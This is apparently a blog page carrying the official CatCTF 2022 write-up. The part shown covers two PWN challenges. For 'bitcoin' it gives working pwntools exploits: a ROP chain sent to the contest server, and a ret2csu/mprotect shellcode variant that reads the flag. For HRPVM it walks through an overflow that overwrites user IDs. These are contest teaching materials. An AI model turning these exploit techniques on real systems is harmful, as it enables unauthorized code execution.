<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP | xia0ji233's blog</title><meta name="author" content="xia0ji233"><meta name="copyright" content="xia0ji233"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CatCTF2022 å®˜æ–¹WP    ## ç›®å½•  -   [æ„Ÿè°¢](#æ„Ÿè°¢) -   [æ‹›æ–°](#æ‹›æ–°) -   [PWN](#PWN)     -   [bitcoinğŸª™](#bitcoin)         -   [EXP](#EXP)         -   [éé¢„æœŸ](#éé¢„æœŸ)         -   [æºç ](#æºç )     -   [HRPVMğŸ–¥ï¸](#HRPVMï¸)">
<meta property="og:type" content="article">
<meta property="og:title" content="æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP">
<meta property="og:url" content="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/index.html">
<meta property="og:site_name" content="xia0ji233&#39;s blog">
<meta property="og:description" content="CatCTF2022 å®˜æ–¹WP    ## ç›®å½•  -   [æ„Ÿè°¢](#æ„Ÿè°¢) -   [æ‹›æ–°](#æ‹›æ–°) -   [PWN](#PWN)     -   [bitcoinğŸª™](#bitcoin)         -   [EXP](#EXP)         -   [éé¢„æœŸ](#éé¢„æœŸ)         -   [æºç ](#æºç )     -   [HRPVMğŸ–¥ï¸](#HRPVMï¸)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xia0ji233.github.io/img/avatar.png">
<meta property="article:published_time" content="2023-01-01T10:00:00.000Z">
<meta property="article:modified_time" content="2023-01-04T06:59:34.064Z">
<meta property="article:author" content="xia0ji233">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xia0ji233.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2023-01-04 14:59:34'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">173</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroud.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="xia0ji233's blog"><span class="site-name">xia0ji233's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-01-01T10:00:00.000Z" title="å‘è¡¨äº 2023-01-01 18:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-01-04T06:59:34.064Z" title="æ›´æ–°äº 2023-01-04 14:59:34">2023-01-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/writeup/">writeup</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/writeup/CatCTF2022/">CatCTF2022</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Nepnep/">Nepnep</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>10åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="æ”»é˜²ä¸–ç•Œ x Nepnep x CATCTF 2022 Nepnepæˆ˜é˜Ÿå®˜æ–¹WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container">
CatCTF2022 å®˜æ–¹WP

<!--more-->

## ç›®å½•

-   [æ„Ÿè°¢](#æ„Ÿè°¢)
-   [æ‹›æ–°](#æ‹›æ–°)
-   [PWN](#PWN)
    -   [bitcoinğŸª™](#bitcoin)
        -   [EXP](#EXP)
        -   [éé¢„æœŸ](#éé¢„æœŸ)
        -   [æºç ](#æºç )
    -   [HRPVMğŸ–¥ï¸](#HRPVMï¸)
        -   [æ¼æ´](#æ¼æ´)
        -   [EXP](#EXP)
        -   [æºç ](#æºç )
    -   [injection2.0ğŸ’‰](#injection20)
        -   [exp](#exp)
        -   [ä¸Šä¼ è„šæœ¬](#ä¸Šä¼ è„šæœ¬)
    -   [kernel-test æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬](#kernel-test-æœ¬æ¬¡èµ„æºåˆé›†åŒ…æ‹¬æºç EXPdocker)
        -   [Ret2usr](#Ret2usr)
        -   [ç®€æ˜“è®²è§£](#ç®€æ˜“è®²è§£)
        -   [æºç ](#æºç )
        -   [é‡ç‚¹](#é‡ç‚¹)
        -   [æ”»å‡»æ€è·¯](#æ”»å‡»æ€è·¯)
        -   [EXP](#EXP)
        -   [ä¸Šä¼ è„šæœ¬](#ä¸Šä¼ è„šæœ¬)
        -   [tips](#tips)
    -   [zipğŸ’¼](#zip)
        -   [éé¢„æœŸ](#éé¢„æœŸ)
        -   [æºç ](#æºç )
    -   [welcome\_cat\_ctfğŸ‰](#welcome_cat_ctf)
    -   [chao ğŸŒ¿](#chao-)
        -   [å‰è¨€](#å‰è¨€)
        -   [é€†å‘åˆ†æ](#é€†å‘åˆ†æ)
        -   [æ¼æ´åˆ©ç”¨](#æ¼æ´åˆ©ç”¨)
        -   [exp](#exp)
        -   [æºç ](#æºç )
    -   [Cat of magicğŸ§™â€â™€ï¸](#Cat-of-magicï¸)
        -   [exp](#exp)
        -   [åœ°å›¾](#åœ°å›¾)
-   [WEB](#WEB)
    -   [ez\_jsğŸ¦](#ez_js)
    -   [Cat catğŸ˜¼](#Cat-cat)
        -   [ä¿¡æ¯æ”¶é›†ä¸å°è¯•](#ä¿¡æ¯æ”¶é›†ä¸å°è¯•)
        -   [é¢˜ç›®é¦–é¡µ](#é¢˜ç›®é¦–é¡µ)
        -   [å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶](#å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶)
        -   [è¯»å–æºç ](#è¯»å–æºç )
        -   [app.py](#apppy)
        -   [ä»£ç å®¡è®¡](#ä»£ç å®¡è®¡)
        -   [å®¡è®¡app.py](#å®¡è®¡apppy)
        -   [flagéƒ¨åˆ†](#flagéƒ¨åˆ†)
        -   [æ–‡ä»¶è¯»å–éƒ¨åˆ†](#æ–‡ä»¶è¯»å–éƒ¨åˆ†)
        -   [å®¡è®¡cat.py](#å®¡è®¡catpy)
        -   [æ–‡ä»¶è¯»å–åŠŸèƒ½](#æ–‡ä»¶è¯»å–åŠŸèƒ½)
        -   [ä½¿ç”¨æ–¹æ³•](#ä½¿ç”¨æ–¹æ³•)
        -   [è§£é¢˜](#è§£é¢˜)
        -   [è·å–secret key](#è·å–secret-key)
        -   [è¯»å–å †æ ˆåˆ†å¸ƒ](#è¯»å–å †æ ˆåˆ†å¸ƒ)
        -   [è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®](#è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®)
        -   [ä¼ªé€ session](#ä¼ªé€ session)
        -   [ä¸€é”®è·å–flag](#ä¸€é”®è·å–flag)
        -   [å†™åœ¨æœ€å](#å†™åœ¨æœ€å)
    -   [ez\_bypassğŸ¥](#ez_bypass)
    -   [ez\_curlğŸ”—](#ez_curl)
    -   [wifeğŸ’ƒ](#wife)
    -   [web\_challengeğŸ’ª](#web_challenge)
-   [CRYPTO](#CRYPTO)
    -   [DDH\_Game](#DDH_Game)
        -   [è§£æ³•ä¸€](#è§£æ³•ä¸€)
        -   [è§£æ³•äºŒ](#è§£æ³•äºŒ)
        -   [åŠ¨æœº](#åŠ¨æœº)
    -   [cat\_theory](#cat_theory)
        -   [é¢˜è§£](#é¢˜è§£)
        -   [åŠ¨æœº](#åŠ¨æœº)
    -   [cat's giftğŸ](#cats-gift)
        -   [é¢˜è§£](#é¢˜è§£)
        -   [åè®°](#åè®°)
    -   [ç›–èŒ¨æ¯”\&can you tell AES from blackboxï¼Ÿ\&samplå‡ºé¢˜äººå‰è¨€](#ç›–èŒ¨æ¯”can-you-tell-AES-from-blackboxsamplå‡ºé¢˜äººå‰è¨€)
    -   [ç›–èŒ¨æ¯”](#ç›–èŒ¨æ¯”)
        -   [mtp](#mtp)
        -   [çˆ†ç ´](#çˆ†ç ´)
    -   [can you tell AES from blackboxï¼Ÿ](#can-you-tell-AES-from-blackbox)
    -   [sample](#sample)
-   [Reverse](#Reverse)
    -   [CatFlyğŸ›«ğŸ±](#CatFly)
    -   [ReadingSection](#ReadingSection)
    -   [StupidOrangeCat2
        ](#StupidOrangeCat2)
    -   [The cat did it](#The-cat-did-it)
        -   [è®¾è®¡æ€è·¯å’Œè§£æ³•](#è®¾è®¡æ€è·¯å’Œè§£æ³•)
        -   [çŒ«çŒ«é•‡æ¥¼](#çŒ«çŒ«é•‡æ¥¼)
    -   [BugCat](#BugCat)
        -   [ä¸€ã€å‰è¨€](#ä¸€å‰è¨€)
        -   [äºŒã€è§£é¢˜æ–¹æ¡ˆ](#äºŒè§£é¢˜æ–¹æ¡ˆ)
        -   [ä¸‰ã€è§£é¢˜è„šæœ¬](#ä¸‰è§£é¢˜è„šæœ¬)
-   [MISC](#MISC)
    -   [catnim](#catnim)
        -   [exp](#exp)
    -   [miao\~](#miao)
    -   [Peekaboo](#Peekaboo)
    -   [MeowMeow](#MeowMeow)
    -   [CatFlag](#CatFlag)
    -   [CatPaw](#CatPaw)
        -   [1. æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€](#1-æ‹¥æœ‰å°ç±³æ‰‹æœºå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€)
        -   [2.å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€](#2å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€)
        -   [3.åˆç†çŒœæµ‹](#3åˆç†çŒœæµ‹)
        -   [4.é‡æ”¾?](#4é‡æ”¾)
    -   [CatJump](#CatJump)
        -   [å‰è¨€](#å‰è¨€)
        -   [å‡ºé¢˜çµæ„Ÿæ¥æº](#å‡ºé¢˜çµæ„Ÿæ¥æº)
        -   [æ­£æ–‡](#æ­£æ–‡)
        -   [è§£é¢˜æ€è·¯1](#è§£é¢˜æ€è·¯1)
        -   [è§£é¢˜æ€è·¯2](#è§£é¢˜æ€è·¯2)
        -   [è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰](#è§£é¢˜æ€è·¯3éé¢„æœŸ)
    -   [CatCat](#CatCat)
    -   [CatchCat](#CatchCat)
    -   [Nepnep ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼
        ](#Nepnep-ç¥ä½ æ–°å¹´å¿«ä¹å•¦)

### æ„Ÿè°¢

æ„Ÿè°¢Nepnepæˆ˜é˜Ÿçš„å„ä½æˆå‘˜ã€æ”»é˜²ä¸–ç•Œçš„è¿ç»´å°å“¥å“¥å°å§å§ä»¬ã€å…¬å¼€æ‹›å‹Ÿçš„å‡ºé¢˜äººå’Œå¿—æ„¿è€…ä»¬ä»¥åŠå„ä½CTFé€‰æ‰‹å¯¹æ­¤æ¬¡å…¬ç›Šæ¯”èµ›çš„æ”¯æŒï¼Œè®©ğŸ±ğŸ±ä»¬å¯ä»¥é¥±é¤ä¸€é¡¿ã€‚æœ€ç»ˆæœ¬æ¬¡æ´»åŠ¨å…±æˆåŠŸå‹Ÿé›†åˆ°1å¨çŒ«ç²®ï¼Œä»¥æ¯åªå°çŒ«æ¯é¡¿60gçŒ«ç²®æ¥è®¡ï¼Œè¶…1.6wåªæµæµªå°çŒ«å°†èƒ½é¥±é¤ä¸€é¡¿ã€‚
æ‹¯æ•‘å–µå–µå¤§ä½œæˆ˜è®¡åˆ’å¤§è·æˆåŠŸğŸ‘ğŸ‘

<https://mp.weixin.qq.com/s/EKiSEZk7Kj7aTZYk4hWhew>

### æ‹›æ–°

Nepnepå¤§åŠ›æ‹›æ–°ï¼Œæ„Ÿå…´è¶£çš„å¸ˆå‚…ä»¬å¯ä»¥æŠ•é€’ç®€å†åˆ°[1764763743@qq.com](mailto:1764763743@qq.com "1764763743@qq.com")ï¼ŒæœŸå¾…å„ä½å¸ˆå‚…çš„åŠ å…¥QWQï¼

## PWN

### bitcoinğŸª™

è¿™ä¸ªé¢˜æˆ‘æ²¡æœ‰å‡ºå¥½ï¼Œå½“æ—¶é˜³äº†=-= è„‘å­å—¡å—¡çš„ å¸Œæœ›å„ä½pwnä¸è¦ä»‹æ„

![](Nepnep-CatCTF2022/01DF1245_G97zrmnsPY.gif)

#### EXP

```python
from pwn import *
#r=process('./pwn')
r=remote("61.147.171.105",59746)
elf=ELF('./pwn')
context.log_level='debug'
rdi=0x0000000000406303
rsi=0x0000000000406301
cin=0x6093A0
use_cin=0x401C30
main=elf.sym['main']
start=elf.sym['_start']
hard=0x609248

r.recv()
r.sendline("")
r.recvuntil(": ")
r.sendline('1')
r.recvuntil(": ")
pa='a'*0x48+p64(rdi)+p64(cin)+p64(rsi)+p64(hard)+p64(0)+p64(use_cin)+p64(0x402937)
r.sendline(pa)
r.sendline(p64(1))
r.interactive()
```

#### éé¢„æœŸ

æˆ‘æ²™ç›’æ£€æµ‹æœºåˆ¶è®¾ç½®çš„ä¸æ˜¯å¾ˆå¥½ï¼Œmprotectè¢«åˆ©ç”¨äº†ï¼Œåˆ©ç”¨csu+shellcodeç›´æ¥æ¢­å“ˆ

éé¢„æœŸå‘ç°è€…ï¼ˆç¬¬ä¸€ä¸ªå’Œæˆ‘åé¦ˆçš„ä¹Ÿè®¸æœ‰åˆ«çš„å¸ˆå‚…ä¹Ÿå‘ç°äº†ï¼‰ï¼šgxh191å¸ˆå‚…

EXP

```python
#encoding=utf-8
from pwn import *
r=process('./pwn')
#r=remote("61.147.171.105",59746)
elf=ELF('./pwn')
gdb.attach(r)
context.log_level='debug'
context.arch='amd64'
rdi=0x0000000000406303
rsi=0x0000000000406301
cin=0x6093A0
use_cin=0x401C30
main=elf.sym['main']
start=elf.sym['_start']
hard=0x609248
def ret_csu(r12, r13, r14, r15, last):
  payload = 0x48 * 'a'  
  #æ„é€ æ ˆæº¢å‡ºçš„padding
  payload += p64(0x4062F6) + 'a' * 8    
  #gadgets1çš„åœ°å€
  payload += p64(0) + p64(1)
  #rbx=0, rbp=1
  payload += p64(r12)
  #callè°ƒç”¨çš„åœ°å€
  payload += p64(r13) + p64(r14) + p64(r15)
  #ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨
  payload += p64(0x4062E0)
  #gadgets2çš„åœ°å€
  payload += 'a' * 56
  #popå‡ºçš„padding
  payload += p64(last)
  #å‡½æ•°æœ€åçš„è¿”å›åœ°å€
  return payload
mprotect=ret_csu(0x6091E0,0x609000,0x1000,7,rdi)
r.recv()
r.sendline("")
r.recvuntil(": ")
r.sendline('1')
r.recvuntil(": ")
pa=mprotect+p64(cin)+p64(rsi)+p64(0x609000)+p64(0)+p64(use_cin)+p64(0x609000)
r.sendline(pa)
r.sendline(asm(shellcraft.cat("./flag")))
#r.sendline(p64(1))
r.interactive()
```

ç¬¬äºŒç§ï¼Œç›´æ¥è·³è½¬åˆ°0x404EA4æŠŠflagè¯»å‡ºæ¥ è¿™æ˜¯æœ€å¸¸è§çš„æ–¹æ³•

#### æºç 

é“¾æ¥ï¼š[https://pan.baidu.com/s/1iTLK3IkVw\_a9OqK5kkXO5w?pwd=yrmv](https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd=yrmv "https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd=yrmv")
æå–ç ï¼šyrmv
\--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº«

### HRPVMğŸ–¥ï¸

æƒ³å‡ºä¸€äº›æœ‰æ„ä¹‰çš„é¢˜ç›®ï¼Œé¢˜ç›®æ¼æ´è™½ç„¶ç®€å•ï¼Œä½†æ˜¯æ¯”è¾ƒé€‚åˆæ–°äººå»è°ƒè¯•å¸ƒå±€å†…å­˜ï¼Œå‡ºé¢˜ä¸æ˜¯ä¸ºäº†æŠ˜ç£¨é€‰æ‰‹ï¼Œæ˜¯ä¸ºäº†å¤§å®¶éƒ½èƒ½å­¦åˆ°ä¸œè¥¿

#### æ¼æ´

create\_fileå‡½æ•°å¯ä»¥æ— é™åˆ›å»ºæ–‡ä»¶æ²¡æœ‰æ£€æŸ¥file\_countçš„å¤§å°

```text
__int64 __fastcall create_file(__int64 a1)
{
  __int64 result; // rax
  int v2; // ebx

  result = check_repeat(a1);
  if ( (_DWORD)result )
  {
    *((_QWORD *)&unk_204130 + 4 * file_count) = global_fd;
    *((_QWORD *)&unk_204128 + 4 * file_count) = a1;
    *((_QWORD *)&HF + 4 * file_count) = 1000LL;
    v2 = file_count;
    *((_QWORD *)&unk_204138 + 4 * v2) = malloc(0x1000uLL);
    printf("FILE CONTENT: ");
    read(0, *((void **)&unk_204138 + 4 * file_count), 0x1000uLL);
    deleEnter(*((_QWORD *)&unk_204138 + 4 * file_count));
    ++file_count;
    return ++global_fd;
  }
  return result;
}
```

æŸ¥çœ‹bssæ®µå‘ç°æ§åˆ¶ç”¨æˆ·æƒé™çš„ç»“æ„ä½“åœ¨æ–‡ä»¶HFçš„ä¸‹é¢

```text
.bss:0000000000204120 ??                            HF db    ? ; 


.bss:0000000000204520 ?? ?? ?? ??                   users dd ? 
```

åˆ©ç”¨æ€è·¯éå¸¸ç®€å•ï¼Œåˆ›å»º32ä¸ªæ–‡ä»¶åˆšå¥½è¦†ç›–åˆ°usersï¼Œç„¶åé€šè¿‡é€†å‘åˆ†æå¯å¾—ï¼Œusersç»“æ„ä½“çš„ä¸€ä¸ªæ•°æ®å­˜æ”¾çš„æ˜¯UIDå’ŒGIDï¼Œè°ƒè¯•å‘ç°ï¼Œç¬¬32ä¸ªæ–‡ä»¶çš„modeåˆšå¥½å¯ä»¥è¦†ç›–åˆ°UIDå’ŒGIDï¼Œå¹¶ä¸”ç”±äºmodeæ˜¯å¯ä»¥é€šè¿‡ä¼ªæ±‡ç¼–ä¿®æ”¹çš„ï¼Œopenä½¿ç”¨æ–¹æ³•åœ¨ç¨‹åºçš„READMEé‡Œé¢ç…§ç€å†™å°±è¡Œäº†ï¼ŒæŠŠmodeæ”¹æˆ0

```text
mov rdi,35;mov rsi,0;call open,2;
```

ä¹‹åå°±å˜æˆäº†UID\&GID==0çš„ç”¨æˆ·äº†ï¼Œç°åœ¨å¯ä»¥è¿›å…¥DEBUGæ§åˆ¶å°äº†ã€‚

åˆ†ædebugå‡½æ•°ï¼Œé‡Œé¢ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯file inputå’Œmmapï¼Œmmapå¯ä»¥è‡ªå®šä¹‰æƒé™ä¸º3çš„æŒ‡å®šåœ°å€æ®µã€‚

file inputå¯ä»¥æŠŠç¨‹åºå¤–æŒ‡å®šçš„æ–‡ä»¶æ‹‰å–åˆ°è™šæ‹Ÿæœºå†…ï¼Œæ‹‰å–åé»˜è®¤çš„æƒé™æ¨¡å¼æ˜¯1000ä¹Ÿå°±æ˜¯ä¸å¯è¯»çŠ¶æ€ã€‚æ­¤æ—¶ï¼Œä¸€èˆ¬çš„é€‰æ‰‹å¯èƒ½æƒ³ç€flagæ‹‰è¿›æ¥äº†ç„¶åexitå‡ºdebugå†å»useræ€ç›´æ¥cat å°±å¯ä»¥è·å–flagäº†

ä½†æ˜¯æ³¨æ„ï¼Œexitåç¨‹åºä¼šæŠŠusersç»“æ„ä½“åˆå§‹åŒ–

```c
deleEnter(buf);
     dword_204524 = 1000;
     users = 1000;
     strncpy(dest, src, 8uLL);
     machine_start();
```

æ­¤æ—¶UIDå’ŒGIDå˜æˆ1000ï¼Œç„¶ådestè¿™æ¬¡å­˜æ”¾çš„å°±æ˜¯å¼€æœºçš„æ—¶å€™è¦æ±‚è¾“å…¥çš„æŒæœ‰è€…ä¹Ÿæ¸…0äº†ï¼Œé€šè¿‡è°ƒè¯•ä¸éš¾å‘ç°è¿™ä¸ªæŒæœ‰è€…å˜é‡å’Œåˆšæ‰ç¬¬32ä¸ªæ–‡ä»¶çš„å­˜æ”¾æ–‡ä»¶åçš„åœ°å€é‡åˆäº†ï¼Œå› ä¸ºexitè¿™é‡Œè¢«æ¸…0äº†ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„flagå¯æ˜¯åœ¨0x23ä¸ªæ–‡ä»¶çš„ä¸‹é¢ï¼Œå¦‚æœå»cat é‡è§ç¬¬0x23ä¸ªæ–‡ä»¶strcmpæ–‡ä»¶åçš„æ—¶å€™ä¼šå› ä¸ºåœ°å€æ— æ•ˆç¨‹åºå´©æºƒï¼Œä½†æ˜¯æ­¤æ—¶èƒ½è·å–åˆ°å·²çŸ¥å¯è¯»å†™çš„åœ°å€æ–¹æ³•å°±ä¸€ä¸ªï¼Œå°±æ˜¯mmapï¼

```text
0x55a2e6708500 <HF+992>:  0x00000000000003e8  0x000055a2e7e66c00
0x55a2e6708510 <HF+1008>:  0x0000000000000022  0x000055a2e7e66c30
0x55a2e6708520 <users>:  0x000003e8000003e8  0x0000000000000000
0x55a2e6708530 <users+16>:  0x0000000000000023  0x000055a2e7e67c70
0x55a2e6708540 <users+32>:  0x00000000000003e8  0x000055a2e7e68c80
0x55a2e6708550 <users+48>:  0x0000000000000024  0x000055a2e7e68cb0
0x55a2e6708560 <users+64>:  0x00000000000003e8  0x000055a2e7e69cc0
0x55a2e6708570:  0x0000000000000025  0x000055a2e7e69f20
0x55a2e6708580 <REG>:  0x0000000000000023  0x0000000000000000

```

